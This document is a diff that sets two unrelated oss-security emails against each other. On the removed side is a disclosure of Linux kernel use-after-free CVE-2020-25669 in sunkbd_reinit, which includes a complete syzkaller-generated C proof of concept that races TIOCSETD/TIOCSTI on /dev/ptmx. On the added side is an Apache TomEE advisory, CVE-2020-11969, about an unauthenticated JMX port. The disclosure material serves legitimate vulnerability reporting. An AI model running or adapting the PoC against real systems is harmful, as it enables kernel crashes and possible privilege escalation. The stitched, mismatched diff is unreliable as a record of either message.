@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5293" "Friday" "20" "November" "2020" "22:41:54" "+0800" "- Nop" "nopitydays@gmail.com" "<CA+-U7QAmO3QQc--t0rQrMC3qwLbKpxpWPH6GPm5LK_0q=40pog@mail.gmail.com>" "224" "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil "11" "2020112014:41:54" "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" (number mark "U       nopitydays@g Nov 20  224/5293  " thread-indent "\"[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit\"\n") "<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>" ("<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>") nil nil nil nil nil nil nil "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["871" "Monday" "15" "June" "2020" "13:45:21" "+0100" "Jonathan Gallimore" "jgallimore@apache.org" "<CAGRgoZiPvmkmdrS1JjMCK-qPiJ+zATuv19jTTjz=orE_z-pYBg@mail.gmail.com>" "32" "[oss-security] CVE-2020-11969 Apache TomEE - useJMX attribute on ActiveMQ resource adapter URI causes authenticated JMX port to be open" nil nil nil "6" "2020061512:45:21" "[oss-security] CVE-2020-11969 Apache TomEE - useJMX attribute on ActiveMQ resource adapter URI causes authenticated JMX port to be open" (number mark "U       jgallimore@a Jun 15   32/871   " thread-indent "\"[oss-security] CVE-2020-11969 Apache TomEE - useJMX attribute on ActiveMQ resource adapter URI causes authenticated JMX port to be open\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-11969 Apache TomEE - useJMX attribute on ActiveMQ resource adapter URI causes authenticated JMX port to be open" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3885 invoked by uid 550); 20 Nov 2020 14:58:58 -0000
+Received: (qmail 3075 invoked by uid 550); 15 Jun 2020 12:52:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,264 +12,51 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32269 invoked from network); 20 Nov 2020 14:42:17 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
-        bh=1uhpKcTs3BE3w0HpPUNlj4c6kMM7yWeltinMlaBeHeA=;
-        b=KGXqV8ZIdoKKa2nsq4wGs70mSOF5tdWddURY120FDLS2Idg7zgtkRd94fB/4CjEU8a
-         7nKa2fgX8HeUdUQSVz+9zpaovpCQCMGznSlXTlriea2lYmzhdChXbvpNQYGOSb6v/V5W
-         GqjxtM0d9+IsqKxpe3ZyaXkmlgHObP+xHipoRtP8Ffohg1NVSAIrRUuh1LF8FP4dcWEg
-         MZtb5PLiOyv4y7IB13oExRGPwEHcFChANV/TRkttfTMX1DjK3MUUIVO3aPuSSS+g67fU
-         CVkRxuyBZxuRiCQpbT4uzndO3OSyl1BFez5QJjtx5WrohsrqwmdnjyToZ9zb/Ux0Xcd6
-         Q2eQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to;
-        bh=1uhpKcTs3BE3w0HpPUNlj4c6kMM7yWeltinMlaBeHeA=;
-        b=mbU974d3i1TBJrJCajxdANOxkOXVPa+nAY6n53H4f+EOG9FBsl0AsYKKl3JbBSM7vy
-         rN+eRDXgNH4hxZA3XpeQ9n48vwoMApiV759Ycqg0hROFjKBiGqor8SUyn5uJpWZchQwI
-         JYMBpoFL5aONGEtKajcedwoQnrLmQfC+4ZtzMeSd9PiIu7FtxISPHS/BpUCRWqoIFev4
-         BTguPNpmnQx9QTOlTfc5iEfOJUZ55aUOCD+N17jOXWRGdFOMDXlc4CcRRO/2AeQUzuRa
-         shRPSFbEiAaKHdh84ObF7NumETDwf7EiQHaCCBpEZ1YhwvXnivsnblbJXMoDhYYEXiOZ
-         A2KQ==
-X-Gm-Message-State: AOAM532JSBBqg+ZoXl0oBjY9Q9ZuS2eOBsbwie8oQVSOtr2C0ewbydMS
-	i5YCpZi49A5Niq8+Ut1/gRQ1V2buLfGJTjk1qiePFCdqwj4tgQ==
-X-Google-Smtp-Source: ABdhPJzjGFNh4OltaZ2VZ0Q7kusBSZJUYtcPHydXDiNUw0yfMMAMsJiXd9NmkTOEfy09NArgmwtd8PzvXdhnj2pvJCk=
-X-Received: by 2002:a1c:3b07:: with SMTP id i7mr10615432wma.118.1605883325830;
- Fri, 20 Nov 2020 06:42:05 -0800 (PST)
+Received: (qmail 31861 invoked from network); 15 Jun 2020 12:45:45 -0000
+X-Gm-Message-State: AOAM530VeMFLz7HuoFRJjE0PFZ5jbTAa82sQHQ9sW2ETsJDxLLatWva4
+	FvJM6isZLrz5qUdDA+cUiG7MGFebg6b77wckC1g=
+X-Google-Smtp-Source: ABdhPJxcEhS5QZgHa4nlH68WZ0GU7rP5hIpDILXp++UUC+CadLK6VJBad8WGE9jxmglbpxqO5pHIJAw7c3Ru5cStwqw=
+X-Received: by 2002:a05:651c:200a:: with SMTP id s10mr12887951ljo.19.1592225131782;
+ Mon, 15 Jun 2020 05:45:31 -0700 (PDT)
 MIME-Version: 1.0
-References: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
-In-Reply-To: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
-From: - Nop <nopitydays@gmail.com>
-Date: Fri, 20 Nov 2020 22:41:54 +0800
-Message-ID: <CA+-U7QAmO3QQc--t0rQrMC3qwLbKpxpWPH6GPm5LK_0q=40pog@mail.gmail.com>
+From: Jonathan Gallimore <jgallimore@apache.org>
+Date: Mon, 15 Jun 2020 13:45:21 +0100
+X-Gmail-Original-Message-ID: <CAGRgoZiPvmkmdrS1JjMCK-qPiJ+zATuv19jTTjz=orE_z-pYBg@mail.gmail.com>
+Message-ID: <CAGRgoZiPvmkmdrS1JjMCK-qPiJ+zATuv19jTTjz=orE_z-pYBg@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="0000000000002fd8fa05b48ad90e"
-Subject: [oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit
+Content-Type: multipart/alternative; boundary="00000000000061e66405a81ecdb7"
+Subject: [oss-security] CVE-2020-11969 Apache TomEE - useJMX attribute on ActiveMQ resource
+ adapter URI causes authenticated JMX port to be open
 
---0000000000002fd8fa05b48ad90e
+--00000000000061e66405a81ecdb7
 Content-Type: text/plain; charset="UTF-8"
 
-Hi,
+CVE-2020-11969: Apache TomEE - useJMX attribute on ActiveMQ resource
+adapter URI causes authenticated JMX port to be open
 
-Patch for this issue is available at
-https://github.com/torvalds/linux/commit/77e70d351db7de07a46ac49b87a6c3c7a60fca7e
+Severity: High
 
-Regards,
-Bodong Zhao
+Vendor: The Apache Software Foundation
 
-On Thu, Nov 5, 2020 at 9:52 AM - Nop <nopitydays@gmail.com> wrote:
+Versions Affected:
+Apache TomEE 8.0.0-M1 - 8.0.1
+Apache TomEE 7.1.0 - 7.1.2
+Apache TomEE 7.0.0-M1 - 7.0.7
+Apache TomEE 1.0.0 - 1.7.5
 
-> Hi,
->
-> We found a use-after-free read in sunkbd_reinit located in
-> drivers/input/keyboard/sunkbd.c,
-> and reproduced it in the latest kernel version (v5.9.4 for now) with
-> CONFIG_KEYBOARD_SUNKBD=y and CONFIG_KASAN=y.
->
-> The root cause of this BUG is :
->
-> The function sunkbd_reinit having been scheduled by sunkbd_interrupt
-> before the struct sunkbd being freed.
-> Though the dangling pointer is set to NULL in sunkbd_disconnect, there is
-> still an alias in sunkbd_reinit thus causing UAF.
->
-> Timeline:
-> * 2020/10/21 - Vulnerability reported to security@kernel.org.
-> * 2020/10/27 - Vulnerability reported to linux-distros@vs.openwall.org.
-> * 2020/10/27 - CVE-2020-25669 assigned.
-> * 2020/11/05 - Vulnerability opened.
->
-> Regards,
-> Bodong Zhao from Tsinghua University
->
-> ------------------------------------
-> PoC:
->
-> // autogenerated by syzkaller (https://github.com/google/syzkaller)
-> // nop@THU
-> #define _GNU_SOURCE
->
-> #include <endian.h>
-> #include <errno.h>
-> #include <pthread.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <time.h>
-> #include <unistd.h>
-> #include <fcntl.h>
->
-> #include <linux/futex.h>
->
-> static void sleep_ms(uint64_t ms)
-> {
->   usleep(ms * 1000);
-> }
->
-> static uint64_t current_time_ms(void)
-> {
->   struct timespec ts;
->   if (clock_gettime(CLOCK_MONOTONIC, &ts))
->     exit(1);
->   return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
-> }
->
-> static void thread_start(void* (*fn)(void*), void* arg)
-> {
->   pthread_t th;
->   pthread_attr_t attr;
->   pthread_attr_init(&attr);
->   pthread_attr_setstacksize(&attr, 128 << 10);
->   int i;
->   for (i = 0; i < 100; i++) {
->     if (pthread_create(&th, &attr, fn, arg) == 0) {
->       pthread_attr_destroy(&attr);
->       return;
->     }
->     if (errno == EAGAIN) {
->       usleep(50);
->       continue;
->     }
->     break;
->   }
->   exit(1);
-> }
->
-> typedef struct {
->   int state;
-> } event_t;
->
-> static void event_init(event_t* ev)
-> {
->   ev->state = 0;
-> }
->
-> static void event_reset(event_t* ev)
-> {
->   ev->state = 0;
-> }
->
-> static void event_set(event_t* ev)
-> {
->   if (ev->state)
->     exit(1);
->   __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
->   syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
-> }
->
-> static void event_wait(event_t* ev)
-> {
->   while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
->     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
-> }
->
-> static int event_isset(event_t* ev)
-> {
->   return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
-> }
->
-> static int event_timedwait(event_t* ev, uint64_t timeout)
-> {
->   uint64_t start = current_time_ms();
->   uint64_t now = start;
->   for (;;) {
->     uint64_t remain = timeout - (now - start);
->     struct timespec ts;
->     ts.tv_sec = remain / 1000;
->     ts.tv_nsec = (remain % 1000) * 1000 * 1000;
->     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0,
-> &ts);
->     if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
->       return 1;
->     now = current_time_ms();
->     if (now - start > timeout)
->       return 0;
->   }
-> }
->
-> struct thread_t {
->   int created, call;
->   event_t ready, done;
-> };
->
-> static struct thread_t threads[2];
-> static void execute_call(int call);
-> static int running;
->
-> static void* thr(void* arg)
-> {
->   struct thread_t* th = (struct thread_t*)arg;
->   for (;;) {
->     event_wait(&th->ready);
->     event_reset(&th->ready);
->     execute_call(th->call);
->     __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
->     event_set(&th->done);
->   }
->   return 0;
-> }
->
-> static void loop(void)
-> {
->   int i, call, thread;
->   for (call = 0; call < 2; call++) {
->     for (thread = 0; thread < (int)(sizeof(threads) / sizeof(threads[0]));
->          thread++) {
->       struct thread_t* th = &threads[thread];
->       if (!th->created) {
->         th->created = 1;
->         event_init(&th->ready);
->         event_init(&th->done);
->         event_set(&th->done);
->         thread_start(thr, th);
->       }
->       if (!event_isset(&th->done))
->         continue;
->       event_reset(&th->done);
->       th->call = call;
->       __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
->       event_set(&th->ready);
->       event_timedwait(&th->done, 45);
->       break;
->     }
->   }
->   for (i = 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
->     sleep_ms(1);
-> }
->
-> uint64_t fd;
-> char buf[100];
->
-> void execute_call(int call)
-> {
->   int disc = 0x2;
->   char ch = 0xff;
->
->   switch (call) {
->   case 0:
->     // call sunkbd_disconnect
->     read(fd, buf, 0);
->     break;
->   case 1:
->     // call sunkbd_interrupt
->     ioctl(fd, 0x5412, &ch); // TIOCSTI
->     break;
->   }
-> }
-> int main(void)
-> {
->   int disc = 0x2;
->   fd = open("/dev/ptmx", O_RDWR, 0);
->   ioctl(fd, 0x5423, &disc); // TIOCSETD
->   loop();
->   return 0;
-> }
->
+Description:
+If Apache TomEE is configured to use the embedded ActiveMQ broker, and the
+broker URI includes the useJMX=true parameter, a JMX port is opened on TCP
+port 1099, which does not include authentication.
 
---0000000000002fd8fa05b48ad90e--
+Mitigation:
+- Upgrade to TomEE 7.0.8 or later
+- Upgrade to TomEE 7.1.3 or later
+- Upgrade to TomEE 8.0.2 or later
+
+Alternatively, users may wish to remove the useJMX option from the URI (the
+default is false).
+
+- The Apache TomEE team.
+
+--00000000000061e66405a81ecdb7--
